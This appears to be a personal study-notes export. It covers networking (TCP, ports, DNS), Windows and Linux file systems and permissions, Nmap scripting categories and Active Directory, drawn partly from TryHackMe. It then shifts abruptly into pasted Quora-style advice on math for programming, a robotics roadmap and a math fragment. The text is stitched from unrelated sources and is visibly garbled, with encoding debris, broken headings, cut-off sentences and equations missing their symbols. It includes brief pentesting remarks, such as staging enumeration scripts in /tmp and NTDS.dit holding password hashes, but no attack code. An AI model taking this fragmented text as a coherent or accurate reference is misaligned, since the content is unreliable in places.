1. SYN - Client: Here's my Initial Number Sequence (ISN)
to **SYN**chronise with (0)  
2. SYN/ACK - Server: Here's my Initial Number Sequence (ISN)
to **SYN**chronise with (5,000), and I **ACK**nowledge your initial
number sequence (0)  
3. ACK - Client: I **ACK**nowledge your Initial Number Sequence (ISN) of
(5,000), here is some data that is my ISN+1 (5,000 + 1)

### TCP Closing a Connection:

  

### Let's quickly explain the process behind TCP closing a connection. First, TCP will close a connection once a device has determined that the other device has successfully received all of the data.

  

### Because TCP reserves system resources on a device, it is best practice to close TCP connections as soon as possible.

  

### To initiate the closure of a TCP connection, the device will send a "FIN" packet to the other device. Of course, with TCP, the other device will also have to acknowledge this packet.

  

### In the illustration, we can see that Alice has sent Bob a "

### FIN

### " packet. Because Bob received this, he will let Alice know that he received it and that he also wants to close the connection (using FIN). Alice has heard Bob loud and clear and will let Bob know that she acknowledges this.

# Network Concepts

## Introduction to IP:

## 

  
<https://www.professormesser.com/network-plus/n10-007/introduction-to-ip/>  
notes:  
• In IP networking, we tend to describe port numbers as one of two
different groups. One of these groups is a non-ephemeral port group.
Non-ephemeral means non temporary. This would be permanent port numbers
that are used and they’re commonly used by applications or services that
are running on a server. Those port numbers are usually defined as port
0 through 1,023.  
• Ephemeral port numbers are temporary port numbers that the client
usually decides to use randomly as it’s sending this information back to
the server. So our server IP address would commonly use a non-ephemeral
port and the client IP address is commonly going to use an ephemeral
port number. This means that TCP port numbers can be between 0 and
65,535 and UDP port numbers can be between 0 and 65,535.  
• Although most servers or services will use permanent or non-ephemeral
port numbers, this is not always the case. A server could choose to use
any number it would like between 0 and 65,535. These port numbers are
used so that we can communicate back and forth from one device to
another. Changing a port number doesn’t add any special kind of security
and you shouldn’t use port numbers as a method to secure a particular
application.

example: 255.255.255.0  
  
**Definition:**  
A subnet mask is number that defines a range of ip addresses in a
network.

turned on in the mask. So for a Class A it would be /8, for Class B it
would be /16, and finally for a Class C it would be /24**

# DNS

  

## What is DNS?

##   

DNS (Domain Name System) provides a simple way for us to communicate
with devices on the internet without remembering complex numbers.  
  
[![](../_resources/47-1.png)]()  
  
  

## What happens when you make a DNS request

  
  
  
1. When you request a domain name, your computer first checks its local
cache to see if you've previously looked up the address recently; if
not, a request to your Recursive DNS Server will be made.  
  
2. A Recursive DNS Server is usually provided by your ISP, but you can
also choose your own. This server also has a local cache of recently
looked up domain names. If a result is found locally, this is sent back
to your computer, and your request ends here (this is common for popular
and heavily requested services such as Google, Facebook, Twitter). If
the request cannot be found locally, a journey begins to find the
correct answer, starting with the internet's root DNS servers.  
  
3. The root servers act as the DNS backbone of the internet; their job
is to redirect you to the correct Top Level Domain Server, depending on
your request. If, for example, you request
[www.tryhackme.com](http://www.tryhackme.com/), the root server will
recognise the Top Level Domain of .com and refer you to the correct TLD
server that deals with .com addresses.  
  
4. The TLD server holds records for where to find the authoritative
server to answer the DNS request. The authoritative server is often also
known as the nameserver for the domain. For example, the name server for
[tryhackme.com](http://tryhackme.com) is
[kip.ns.cloudflare.com](http://kip.ns.cloudflare.com) and
[uma.ns.cloudflare.com](http://uma.ns.cloudflare.com). You'll often find
multiple nameservers for a domain name to act as a backup in case one
goes down.  
  
5. An authoritative DNS server is the server that is responsible for
storing the DNS records for a particular domain name and where any
updates to your domain name DNS records would be made. Depending on the
record type, the DNS record is then sent back to the Recursive DNS
Server, where a local copy will be cached for future requests and then
relayed back to the original client that made the request. DNS records
all come with a TTL (Time To Live) value. This value is a number
represented in seconds that the response should be saved for locally
until you have to look it up again. Caching saves on having to make a
DNS request every time you communicate with a server.  
  
DNS records type:  
**A Record**  
These records resolve to IPv4 addresses, for example 104.26.10.229  
**AAAA Record**  
These records resolve to IPv6 addresses, for example
2606:4700:20::681a:be5  
  
**CNAME Record**  
These records resolve to another domain name, for example, TryHackMe's
online shop has the subdomain name store.tryhackme.com which returns a
CNAME record shops.shopify.com. Another DNS request would then be made
to shops.shopify.com to work out the IP address.  
  
**MX Record**  
These records resolve to the address of the servers that handle the
email for the domain you are querying, for example an MX record response
for tryhackme.com would look something like alt1.aspmx.l.google.com.
These records also come with a priority flag. This tells the client in
which order to try the servers, this is perfect for if the main server
goes down and email needs to be sent to a backup server.  
**TXT Record**  
TXT records are free text fields where any text-based data can be
stored. TXT records have multiple uses, but some common ones can be to
list servers that have the authority to send an email on behalf of the
domain (this can help in the battle against spam and spoofed email).
They can also be used to verify ownership of the domain name when
signing up for third party services.

# Windows/system32 folders

  
From: THM  
The Windows folder (`C:\Windows`) is traditionally known as the folder
which contains the Windows operating system.   
The folder doesn't have to reside in the C drive necessarily. It can
reside in any other drive and technically can reside in a different
folder.  
This is where environment variables, more specifically system
environment variables, come into play. <span class="small">Even though
not discussed yet, the system  environment variable for the Windows
directory is</span> `%windir%`<span class="small">.</span>  
Per
[Microsoft](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables?view=powershell-7.1),
"*Environment variables store information about the operating system
environment. This information includes details such as the operating
system path, the number of processors used by the operating system, and
the location of temporary folders*".  
  
The System32 folder holds the important files that are critical for the
operating system.  
You should proceed with extreme caution when interacting with this
folder. Accidentally deleting any files or folders within System32 can
render the Windows OS inoperational. Read more about this action
[here](https://www.howtogeek.com/346997/what-is-the-system32-directory-and-why-you-shouldnt-delete-it/).   

# User Account type

  
User accounts can be one of two types on a typical local Windows system:
**Administrator** & **Standard User**.   
The user account type will determine what actions the user can perform
on that specific Windows system.   
• An Administrator can make changes to the system: add users, delete
users, modify groups, modify settings on the system, etc.   
• A Standard User can only make changes to folders/files attributed to
the user & can't perform system-level changes, such as install
programs.  
  
You are currently logged in as an Administrator. There are several ways
to determine which user accounts exist on the system.   
One way is to click the `Start Menu` and type `Other User`. A shortcut
to `System Settings > Other users` should appear.   
  
When a user account is created, a profile is created for the user. The
location for each user profile folder will fall under is C:\Users.  
For example, the user profile folder for the user account Max will be
C:\Users\Max.  
  
Another way to access this information, and then some, is using **Local
User and Group Management**.   
lusrmgr.msc  
  

# UAC - User Account Control

  
The large majority of home users are logged into their Windows systems
as local administrators.  
  
UAC (by default) doesn't apply for the built-in local administrator
account.   
  
How does UAC work? When a user with an account type of administrator
logs into a system, the current session doesn't run with elevated
permissions. When an operation requiring higher-level privileges needs
to execute, the user will be prompted to confirm if they permit the
operation to run.

# Servers

  

## What is a server?

  
A server is a piece of hardware or software equipment that provides
functionality for other softwares or devices.  
  
  

## Types of servers

  
Servers can be used for a variety of actions or things. The most common
ones are:  
• Domain Controller  
• File server  
• Web server  
• FTP Server  
• Mail Server  
• Database Server  
• Proxy Server  
• Application Server  
  
**Domain Controller** - Might be one of the most important servers
because in an AD or AAD infrastructure we can control users, groups,
restrict actions, improve security, and many more of other computers and
servers.  
  
**File Server -** File servers provide a great way to share files across
devices on a network.  
  
**Web Server-** It serves static or dynamic content to a Web browser by
loading a file from a disk and serving it across the network to a
userâ€™s Web browser.  
**FTP Server -** Makes possible moving one or more files securely
between computers while providing file security and organization as well
as transfer control.  
**Mail Server -** Mail servers move and store mail over corporate
networks (via LANs and WANs) and across the Internet.  
**Database Server -** A database server is a computer system that
provides other computers with services related to accessing and
retrieving data from one or multiple databases.  
**Proxy Server -** This server usually sits between a client program and
an external server to filter requests, improve performance, and share
connections.  
**Application Server -** They're usually used to connect the database
servers and the users.  

# File System

  
◇ <span class="small">The file system used in modern versions
of Windows is the</span> **<span class="small">New Technology File
System</span>** <span class="small">or

◇ NTFS is known as a journaling file system. In case of a failure, the
file system can automatically ***repair the folders/files on disk using
information stored in a log file*****.** This function is not possible
with FAT.   
  
◇ NTFS addresses many of the limitations of the previous¬†file systems;
such as:¬†  
• Supports files larger than 4GB  
• Set specific permissions on folders and files  
• Folder and file compression  
• Encryption ([Encryption File
System](https://docs.microsoft.com/en-us/windows/win32/fileio/file-encryption)
or **EFS**)

◇ What is a file system ?  
▪ A file system is a process of managing how and where data on a storage
disk, which is also referred to as file management or FS.  
▪ *a file system* is a structured representation of data and a set of
**metadata** describing this data.  
▪ a file system operates *blocks*. **File system blocks** are groups of
sectors that optimize storage addressing.  
▪ Constant *write/delete operations* in the file system cause its
**fragmentation**.

◇ File Allocation Table (FAT)  
▪ The FAT file system is characterized by the file allocation table
(FAT), which is really a table that resides at the very "top" of the
volume.  
  
  
File System:  
It is the method and data structure that an operating system uses to
keep track of files on a disk or partition. Without a file system, the
information saved in a storage media would be one large body of data
with no way to tell where the information begins and ends.  
  
  
Windows file system structure is:  
• Logical drives (Ex: Local Disk C)  
• Folders (these are the folders that come by default. Ex: Documents,
Downloads, Music)  
• Files  
  
  
  
Something that might also interest you would be the folders located on
the C drive and their role. These folders are:  
◇ PerfLogs  
◇ Program Files  
◇ Program Files (x86)  
◇ Users  
◇ Windows  
  
Let me break them down and explain each of them:  
1. PerfLogs - Stores the system issues and other reports regarding
performance  
2. Program Files and Program Files (x86) - Is the location where
programs install unless you change their path (Ex: Choosing to install
software on D drive)  
3. Users - In this folder are stored the users created. It also stores
users generated data (Ex: Saving a file on your Desktop)  
4. Windows - It's the folder which basically contains the code to run
the operating system and some utility tools (we'll talk about them
later)

# File Permissions

  
On NTFS volumes, you can set permissions that grant or deny access to
files and folders.  
The permissions are:  
• **Full control**  
• **Modify**  
• **Read & Execute**  
• **List folder contents**  
• **Read**  
• **Write**  
  
[![](../_resources/26-1.png)]()  
  
  
  

## File permissions

### ´╗┐

  
  

### ´╗┐FIles permissions can be set by an administrator or a privileged account. These permissions can be applied to:

  
•

### Users

  
•

### Groups

  
  

### Permissions that can be set are:

  
◇

### Full control

  
◇

### Modify

  
◇

### Read & execute

  
◇

### List folders content

  
◇

### Read 

  
◇

### Write

  
◇

### Special permissions

  
  

### Full control - allows the user/users/group/groups to set the ownership of the folder, set permission for others, modify, read, write, and execute files. 

  

### Modify - allows the user/users/group/groups to modify, read, write, and execute files. 

  

### Read & execute - allows the user/users/group/groups to read and execute files.

  

### List folder contents - allows the user/users/group/groups to list the contents (files, subfolders, etc) of a folder. 

  

### Read - only allows the user/users/group/groups to read files. 

  

### Write - allows the user/users/group/groups to write data to the specified folder (automatically set when "Modify" right is checked).

  
  

### A tool you can use to check the files or folder permissions is "

### icacls

### ".

  
  
Let's explain what those letters in parentheses mean as right now you
might be confused.  
I - permission inherited from the parent container  
F - full access (full control)  
M - Modify right/access  
  
OI - object inherit  
IO - inherit only  
  
CI - container inherit  
RX - read and execute  
  
AD - append data (add subdirectories)  
  
WD - write data and add files  
  

# Authentication

  

## What is authentication?

  

### ﻿

Authentication is a process for verifying the identity of a person (or
an object or a service). When you authenticate a person, the goal is to
verify that the person is not an imposter.  
  
  

## Local authentication

  

### ´╗┐Local authentication is done using the Local Security Authority (LSA). LSA is a protected subsystem that keeps track of the security policies and the accounts that are on a computer system. It also maintains information about all aspects of local security on a computer.

Processes are the programs that are running on your machine. They are
managed by the kernel, where each process will have an ID associated
with it, also known as its PID. The PID increments for the order In
which the process starts. I.e. the 60th process will have a PID of 60.

### An Introduction to Backgrounding and Foregrounding

###  

### in Linux

  

### Processes can run in two states: In the background and in the foreground. For example, commands that you run in your terminal such as "echo" or things of that sort will run in the foreground of your terminal as it is the only command provided that hasn't been told to run in the background. "Echo" is a great example as the output of echo will return to you in the foreground, but wouldn't in the background

In Linux system there are two types permissions are available:  
1. File Permission  
2. Special Permission  
3.  
In File permission we set permission on files and folders:  
The permissions are:  
• read(4)  
• write(2)  
• execute(1)  
  
While in special permission three types of permission are:  
◇ SUID(4)  
◇ SGID(2)  
◇ Sticky Bit(1)  
  
In your question you ask what is difference, so there is no any
difference between `chmod 777 and 0777` because there is
`no any octal value` which show value of (0) zero.

# Common Directories

  

### ◇

### /etc

### 

  
This root directory is one of the most important root directories on
your system. The etc folder (short for etcetera) is a commonplace
location to store system files that are used by your operating
system.   
  
▪ passwd  
▪ shadow \[SHA512\]  
  
◇

### /var

  
The "/var" directory, with "var" being short for variable data,  is one
of the main root folders found on a Linux install. This folder stores
data that is frequently accessed or written by services or applications
running on the system. For example, log files from running services and
applications are written here (**/var/log**), or other data that is not
necessarily associated with a specific user (i.e., databases and the
like).  
  
◇ /

### root

  
Unlike the **/home** directory, the **/root**¬†folder is actually the
home for the "root" system user. There isn't anything more to this
folder other than just understanding that this is the home directory for
the "root" user. But, it is worth a mention as the logical presumption
is that this user would have their data in a directory such as
"**/home/root**" by default.<span class="small">¬†</span>  
  
◇

### /tmp

  
This is a unique root directory found on a Linux install. Short for
"**temporary**", the /tmp directory is volatile and is used to store
data that is only needed to be accessed once or twice. Similar to the
memory on your computer, once the computer is restarted, the contents of
this folder are cleared out.  
**<span style="text-decoration:underline;">What's useful for us in
pentesting is that any user can write to this folder by default. Meaning
once we have access to a machine, it serves as a good place to store
things like our enumeration scripts.</span>**

## What are Crawlers and how do They Work?

  
<span class="small">These crawlers discover content through various
means. One being by pure discovery, where a URL is visited by the
crawler and information regarding the content type of the website is
returned to the search engine. In fact, there are lots of information
modern crawlers scrape – but we will discuss how this is used later.
Another method crawlers use to discover content is by following any and
all URLs found from previously crawled websites. Much like a virus in
the sense that it will want to traverse/spread to everything it
can.</span>  
  
<span class="small">However, as we previously mentioned,</span>
**crawlers attempt to traverse, termed as crawling, every URL and file
that they can find!** <span class="small">Say if
“</span>**mywebsite.com**<span class="small">” had the same keywords as
before (“Apple", “Banana” and “Pear”), but also had a URL to another
website “</span>**anotherwebsite.com**<span class="small">”, the crawler
will then attempt to traverse everything on that URL
(</span>**<span class="small">anotherwebsite.com</span>**<span class="small">)
and retrieve the contents of everything within that domain
respectively.</span>

The **N**map **S**cripting **E**ngine (NSE) is an incredibly powerful

Scripts are written in the *Lua* programming language, and can be used
to do a variety of things: from scanning for vulnerabilities, to
automating exploits for them. The NSE is particularly useful for
reconnaisance, however, it is well worth bearing in mind how extensive
the script library is.  
There are many categories available. Some useful categories include:  
• `safe`:- Won't affect the target  
• `intrusive`:- Not safe: likely to affect the target  
• `vuln`:- Scan for vulnerabilities  
• `exploit`:- Attempt to exploit a vulnerability  
• `auth`:- Attempt to bypass authentication for running services (e.g.
Log into an FTP server anonymously)  
• `brute`:- Attempt to bruteforce credentials for running services  
• `discovery`:- Attempt to query running services for further
information about the network (e.g. query an SNMP server).

# Getting started

  

# Active Directory (AD)

  

## Active Directory is the directory service for Windows Domain Networks. It is used by many of today's top companies and is a vital skill to comprehend when attacking Windows.

  
  
--------&gt;&gt;  
  
<span class="small">Active Directory is a collection of machines and
servers connected inside of domains, that are a collective part of a
bigger forest of domains, that make up the Active Directory
network.</span>  
  
---------&gt;&gt;  
  
What is a Windows domain network?  
======================  
A Windows domain is a **form of a computer network in which all user
accounts, computers, printers and other security principals**, are
registered with a central database located on one or more clusters of
central computers known as domain controllers  
  
Why active directory  
=============  
<span class="small">The majority of large companies use Active Directory
because it allows for the control and monitoring of their user's
computers through a single domain controller. It allows a single user to
sign in to any computer on the active directory network and have access
to his or her stored files and folders in the server, as well as the
local storage on that machine. This allows for any user in the company
to use any machine that the company owns, without having to set up
multiple users on a machine. Active Directory does it all for
you.</span>  
  
  

## Types of Active Directory

  

### There are two types of Active Directory:

  
•

### On-Premise Active Directory (AD)

  
•

### Azure Active Directory

## 

### ﻿(AAD)

  
  
  

## Authentication on On-Premise Active Directory

  
========================================  

# Physical AD

  
<span class="small">The physical Active Directory is the servers and
machines on-premise, these can be anything from domain controllers and
storage servers to domain user machines; everything needed for an Active
Directory environment besides the software.</span>  
  
  

## Domain Controllers -

  

### ﻿A domain controller is a Windows server that has Active Directory Domain Services (AD DS) installed and has been promoted to a domain controller in the forest. Domain controllers are the center of Active Directory -- they control the rest of the domain. I will outline the tasks of a domain controller below: 

  
•

### holds the AD DS data store 

  
•

### handles authentication and authorization services 

  
•

### replicate updates from other domain controllers in the forest

  
•

### Allows admin access to manage domain resources

  
  
  
[![](../_resources/249-1.png)](https://i.imgur.com/SgqBTx8.png)  
  
  
  

## AD DS Data Store - 

  
The Active Directory Data Store holds the databases and processes needed
to store and manage directory information such as users, groups, and
services. Below is an outline of some of the contents and
characteristics of the AD DS Data Store:  
• Contains the NTDS.dit - a database that contains all of the
information of an Active Directory domain controller as well as password
hashes for domain users  
• Stored by default in %SystemRoot%\NTDS  
• accessible only by the domain controller  
  
That is everything that you need to know in terms of physical and
on-premise Active Directory. Now move on to learn about the software and
infrastructure behind the network.

With the knowledge of basic maths(algebra, geometry,number system etc) ,
permutation and combination, sets and relation u can solve most of the
programming problems.  
For advanced learning, learn Number theory for better understanding of
maths for competitive programming. Check this :  
[Where can I get the best online tutorials on number theory for
competitive
programming?](https://www.quora.com/Where-can-I-get-the-best-online-tutorials-on-number-theory-for-competitive-programming)  
Don't just start learning random stuffs, because if u don't feel the
need to learn anything, u would find it useless and boring. Start
practicing problems under maths tag in SPOJ, Codeforces etc if u are
interested in maths. If u are unable to solve it, then learn the
required concept.  
Here are some mathematical topics that u may encounter in programming
competitions :  
• Modular arithmetic, extended Euclid, Euler's totient function, Moebius
function, Binomical coefficients, Bernoulli numbers, linear diophantine
equations  
• Matrices, Gauss algorithm  
• Discrete probabilities, linearity of expectation, probability of
conjunction of independent variables, distribution of order
statistics.  
• Combinatorics, rule of sum/product, inclusion/exclusion principle,
Burnside lemma, Gray code, Catalan numbers  
• Simple analitycal geometry (line intersection, line/circle
intersection, inscribed circle), convex hull.  
• Recurrence relations, linear recurrences  
• Polynomials, fast Fourier transform  
• Hall's marriage theorem, Menger's theorem (graph problems in general
tend to be math-heavy).  
  
  
  
**Realize the world of mathematics again -** Focus on certain key
aspects of mathematics like- probability, matrices and determinants,
BODMAS realization etc. To be on toes, join [Khan
Academy](https://www.khanacademy.org/) and/or [Function
Space](http://functionspace.org/) they have very expressive and great
programming and mathematical intersections for the learners. This will
not only, help you to be programming mathematically, but to thing
mathematically as well ( Algorithms, Data Structure, Machine Learning
etc.)  
  
I think you should start with the basic concepts of mathematics like
permutation combination, probability, statistics, calculus, linear
equations, quadratics etc.  
  
Some important topics you should know about are:  
• **Ad Hoc Mathematics**  
◇ The Simple Ones  
◇ Mathematical Simulation (Brute Force)  
◇ Finding Pattern or Formula  
◇ Grid  
◇ Number systems and Sequences  
◇ Logarithm exponentiation and power  
◇ Polynomial  
◇ Base Number Variant  
◇ Just Ad Hoc  
  
• **Java Big Integer**  
◇ Basic Features  
◇ Bonus Features  
  
• **Combinatorics**  
◇ Fibonacci Numbers  
◇ Binomial Coefficients  
◇ Catalan Numbers  
  
• **Number Theory**  
◇ Prime Numbers  
◇ GCD and LCM  
◇ Factorial  
◇ Prime Factors  
◇ Working with Prime Factors  
◇ Functions involving Prime Factors  
◇ Modifies Sieve  
◇ Modulo Arithmetic  
◇ Euclid/Linear Diophantine Equation  
  
• **Probability Theory**  
• **Cycle Finding**  
◇ Floyd’s Tortoise‐Hare Algorithm  
  
• **Game Theory**  
◇ Nim Game (Sprague Grundy Theorem)  
◇ Two Players Game, Minimax  
  
  
• Base conversions -- converting among binary, octal, hex, and decimal.
Practice: pick numbers and do the conversions on paper, then write
programs to do these conversions.  
• Algebra and basic number theory -- enough to be able to rewrite
expressions into more convenient forms. Project Euler (projecteuler.net)
problems can help with this.  
• Basic combinatorics -- be familiar with the common patterns of numbers
that come up in algorithms (e.g., triangular numbers in O(n^2) sorting
algorithms like insertion sort).  
• Recursive function definitions -- dynamic programming problems are
vastly easier if you can formulate a function recursively, because the
algorithm can usually be described concisely with a recursive function.
If thinking recursively is difficult, I'd recommend studying *How to
Design Programs* (second edition), since it's freely available and takes
a data-driven approach to recursion that is a safe and consistent way to
write recursive functions.  
  
1. **Number Thoery-**seive,fibonacci,primility test,gcd,modular
arithmetic,diophantine equation, etc  
2. **probability-**Bayesâ€™s theorem,probability distribution,etc  
3. **Combinatorics-** Permutations,Arrangements,sorting  
4. **Statistics-**Mean,Median,Varinace.  
5. **Graph theory-**Path,Node,Colouring,Matching,Flow ,etc  
  
  
Topics which you should know :-  
1. Set Theory (falls under Abstract Alg.) \[Very Very Important\]  
2. Probability \[Very Very Important\]  
3. Graph Theory \[Very Very Very Important\]  
4. Abstract Algebra \[Ring, fields, Sets\]  
5. Number Theory \[Very Important\]  
6. Convex Optimizations \[Important from Research Prospective\]  
7. Statistics \[Important from Research Prospective\]  
8. Propositional Logic and Proofs.  
9. Counting or Permutations and Combination  
10. Linear Algebra and Some trigonometry \[Required for Computer
Graphics or GameDev\]  
11. Computational Geometry \[Important from Research Prospective\]  
  
• **Discrete Math:** This is first and foremost. Things like
combinatorics, graph theory, logic, are crucial to computer science.
Ultimately we are working on discrete machines (even the theoretical
ones, like Turing machines or Church’s Lambda Calculus) and we can at
best talk about approximations of continuous things. Still, this doesn’t
mean that we can’t use continuity as a good model, as in  
• **Real Analysis:** If you take an algorithms course (fundamentally a
discrete endeavor) your time analyses are going to be in terms of
“big-oh” notation; this is ultimately how functions act asymptotically
as their inputs range across all possible values. While this is
ultimately discrete in nature it is useful to use calculus/real analysis
and embed our functions to analyze into a continuum (like

## R

  
• ).  
• **Manifold Theory:** Manifolds are a branch of topology and geometry.
These turn up in a lot of machine learning theory since the algorithms
involved are implicitly discovering an

## n

  
• -manifold in some ambient space. I’m not an ML guy myself so I can’t
tell you any more than that, but this is an active area of research.  
• **Topology:** More general than manifold theory, topology has some
surprising applications in the theory of computation; in combinatorics;
in networks (and also in machine learning, as above).  
• **Stats and Probability Theory:** Again, ML. Also stats is king for
empirical analysis  
• **Abstract Algebra:** This comes up everywhere. The study of
programming language design, for example, models some nice properties
(such as the type system) algebraically. Take a type system with a basic
subtyping relation, and assume that there is some “greatest type”
(called the join or least upper bound of all the other elements; think
`Object` in java). This forms a join-semilattice under the
least-common-super-type operation: given types

## T

## T

satisfying this also satisfied

## T

• . Look into lattices for more on this; it’s pretty straight forward
but kinda formal.  
  
Another place algebraic nonsense shows up is in managing computing state
mathematically. This is actually very difficult to model well. What
languages like Haskell implemented was a *monad:* a wrapper that is
(loosely) based on the categorical notion of a *strong monad.* Basically
a monad has two operations: it allows you to inject a value into the
monad and it allows you to take monads w/ values and turn them into the
same monad w/ a new value (possibly of a new type); further, these
operations have to satisfy some basic sanity laws that you would
intuitively think were true but for which certain degenerate cases can
be conjured up to violate if a truly vile and horrible person were to
put their mind to it…  
• **Theory of Computation and Complexity:** Computation is discrete but
it is a nice little theory in its own right. Complexity (also discrete)
has turned into a very interesting and difficult topic (look into P =
NP).  
This is a very CS-centric type of math that often has inspiration from
various backgrounds.  
• **Number Theory:** Cryptography, that thing that makes your amazon
purchases possible, is completely dependent upon number theory. Look
into RSA, for example  
• **Linear Algebra:** This belongs towards the top of the list and is
arguably a subfield of abstract algebra. Linear algebra can be used for
graphics; for large data sets; for compression algorithms; for
encryption (AES); for information encoding (finding sparse matrices,
etc).  
  
  
**Situation 1 || If you wanted to be a Software Engineer:**  
Software Engineering profiles are not that mathematics intensive. Even
in the industry you really have deals with Little to No mathematics.
Though you still need to learn so of the topics to get a CS degree Or to
build a great analytical mind.  
• Integral Calculus & Differential Calculus  
• Liner Algebra ( specially Matrices e.g:
Addition,Multiplication,Transpose,Eigen values & vectors etc etc)  
• Statistics & Probability ( Beginner level || e.g: Bay's Theorem,
Conditional probabilities, Different distribution, PDF, CDF,
Standardization etc etc)  
**Discreet Mathematics:**  
• Graph Theory  
• Group Theory  
• Set, Relation  
• Functions  
• Combinatorics  
• Graph Coloring Problems.  
  
**Situation 2 || If you wanted to be a CS researcher or ML, AI engineer
:**  
Machine learning or Artificial Intelligence = Mathematics. Those
specialized fields are very mathematics intensive and deals with lots of
Geometric intuitions and formulas.  
◇ Calculus (Intermediate level ^\_^)  
◇ Liner Algebra: Vectors, Plane, Line, Dimensions, Cube, Cuboid,
Ellipse, Ellipsoid, Circle, Matrices …… … .  
◇ Probability & Statistics(Intermediate level) :Different theorem,
Conditional Probability, Plots, Histogram, Deviations, Gaussian, PDF,
CDF, Skewness, Kurtosis, Sampling, CLT, Distributions, Inequality,
Transformation, BOX-COX, PCC, CI, Bootstrapping, Hypothesis Testing,
Dimensionaity reduction, PLA, t-SNE… … … . etc etc)  
◇ Graph Theory & Combinatorics for Optimization & efficiency problems.  
  
**Situation 3 || If you wanted to deal with Theoretical Computer
Science:**  
Theoretical CS majorly deals with optimization, speed and efficiency
related problems. Cryptography which is a field of Network Security is
also the part of theoretical CS.  
**Optimization,Efficiency related problems:**  
• Graph Theory  
• Graph Coloring  
• Combinatorics  
• Set, relationship,  
• Proofs  
• Calculus  
• Differential Equations  
• Puzzles  
  
**Cryptography:**

◇ Group Theory  
◇ Different Encryptions, Hashing  
◇ Functions  
◇ Ciphers  
◇ Matrices  
◇ Fourier Transforms etc etcâ€¦ . . .

7. And the list is goes on.......  
  
Maybe the road map I created will help you in your journey to learn
robotics. I see this question being asked a lot.  
[![](../_resources/301-1.png)](https://qph.fs.quoracdn.net/main-qimg-d95da04cd770297ff999d4de5e79f6df)  
  
  
The road map has 4 levels and each level focuses on 4 core concepts.  
**Warm-up level**  
1. *Learn coding:* Start picking up at least one handy **programming
language**. Arduino IDE is good. Python is great. C/C++ will be
fantastic. *My suggestion would be Python*. There are several reasons
for this and later in the road map you will see why.  
2. *Learn electronics:* Start building basic electronic **circuits**. It
can be as simple as lighting up an LED. Next light up more LEDs. Make a
simple traffic signal. Implement switches. Learn the theoretical ideas
behind how voltage, current, resistors, transistors, series & parallel
circuits work. Explore sensors and servo motors too!  
3. *Learn basic assembling:* As kids we loved making toys and building
stuff. Do the same here. Learn to make some basic structures using wood,
acrylic, fiber, or plastic.  
4. *Integrate with micro-controller:* With knowledge of the above
concepts, you should try and test them on a basic micro-controller.
After all, you want your circuit to “react”. The most popular choice
among hobbyists and beginners is to go with **Arduino**. Arduino has
truly simplified the process of coding and implementing basic
reactionary circuits.  
[![](../_resources/301-2.png)](https://qph.fs.quoracdn.net/main-qimg-724e8ccc668406d26424d35eb21a6105-pjlq)  
  
  
*(Resources: YouTube, Khan Academy, Code, Coursera, Udemy)*  
**Beginner level**  
1. *Learn Object-Oriented Programming:* It is not only important to code
in robotics but also **how to code well**. Object-oriented programming
(OOP) is a tremendous muscle to grow and earlier you can do this, the
more you will thank yourself in the future. OOP isn’t exclusive to
Python. However, in Python you can implement these easily and practice.
Through OOP, you will learn about classes, methods, inheritance, etc and
this is an excellent technique for writing functional, modular, and
efficient codes.  
2. *Learn physics, probability, and linear algebra:* As you are growing
from an infant roboticist to an adolescent, it is important that you
also know how robotics is written, read, and spoken by others in the
community. This robotics language heavily uses **physics, probability,
and linear algebra.** Yes, you may not enjoy these subjects in school or
university but trust me you need them if you are serious about robotics.
You cannot do computer vision without knowing about matrices. You cannot
do path planning without knowing about physics. You cannot do artificial
intelligence or machine learning without knowing about probability.  
3. *More involved computer skills:* Now what do I mean by that? A lot of
newcomers to robotics get stumped (I was too!) that they need to learn
this new alien looking operating system that has a penguin somewhere
next to it. I am talking about **Linux** operating system. It is
imperative that for someone looking to get deeper into robotics should
familiarize themselves with Linux. A lot of libraries, packages, and
software developed for robotics are distributed very easily and
efficiently on Linux environments. Popular linux OS choice: **Ubuntu**  
4. *Embedded systems:* Now that you have developed better knowledge of
coding, circuitry, theoretical concepts, and familiarity with Linux, we
need to implement these on a smaller computer than our laptop. So go
ahead and try **warmup level** concepts along with the above concepts on
a mini-computer such as Raspberry Pi or the BeagleBone. Hook on some
sensors, servos, and a camera to one of these min-computers, and write
some code to sense, move, and detect stuff!

*(Resources: YouTube, Khan Academy, Code, Coursera, MIT OCW)*  
**Intermediate level**  
1. *Develop theoretical foundations:* Here depending on what area of
robotics you are interested in, you need to learn more into the theory
behind it. Learn about **robotic arm manipulation** (kinematics &
control), **perception** (computer vision, linear algebra, matrices),
**machine learning/artificial intelligence** (probability, statistics,
maths). Do you see how some of the previous concepts are fundamental to
these core robotics areas?  
2. *Use advanced libraries:* Now you need to implement machine learning
and/or computer vision algorithms on your robot. After all, the robot
should be able to see and think and learn, right? On Python, there are
amazing **libraries** written for implementing machine learning and
computer vision algorithms e.g. tensor flow and OpenCV. Similarly, a lot
of AI can be practiced on Python as well. Of course you can do the same
in C/C++. However, I am trying to keep it consistent here.  
3. *Get familiar with ROS:* With the knowledge of all of the above, an
excellent middle-ware that one should learn is the **Robot Operating
System** (ROS). It can be a little tricky to pick up at first. However,
ROS opens up your doors to test advanced algorithms and simulations on
robots that you don’t even have! Want to fly a quadcopter? Or navigate a
robot autonomously in a map? How about getting an industrial arm to pick
up an object? You can do that in ROS via its simulation environment
named Gazebo.  
4. *More CAD:* You may be interested to develop and design complex
robots. Start learning **3D design software** such as Blender or
SolidWorks so that you can design your own robots.

**Expert level**  
1. *Keep learning and growing:* Each concept mentioned above is endless
by its own virtue, and to become an expert in robotics, you will need to
invest the time and keep learning. You will realize that you need to
learn more classifiers or models to detect objects/images better. Or you
might need to learn more about control algorithms to optimize your
solutions.  
2. *More software/hardware:* Depending on your area of interest and
specialization, you will be doing more and more of coding, algorithmic
development, ROS, and/or robotic designing.  
Lastly, I am definitely not an expert and hence I cannot add much to
that. What I can say for sure is even I do not know what I do not know.
One important thing to remember is: ***get started and be consistent
=)***

# Sequence and series

  
• In mathematics, a sequence is an ordered list of objects.  
• The number of ordered elements (possibly infinite) is called the
length of the sequence  
• Unlike a set, order matters, and a particular term can appear multiple
times at different positions in the sequence.  
• For example,

## (M,A,R,Y)

is a sequence of letters that differs from

## (A,R,M,Y)

, as the ordering matters, and

## (1,1,2,3,5,8)

, which contains the number 1 at two different positions, is a valid
sequence. Sequences can be finite, as in this example, or infinite, such
as the sequence of all even positive integers

## (2,4,6,⋯)

. Finite sequences are sometimes known as strings or words and infinite
sequences as streams

## Assosiative property:

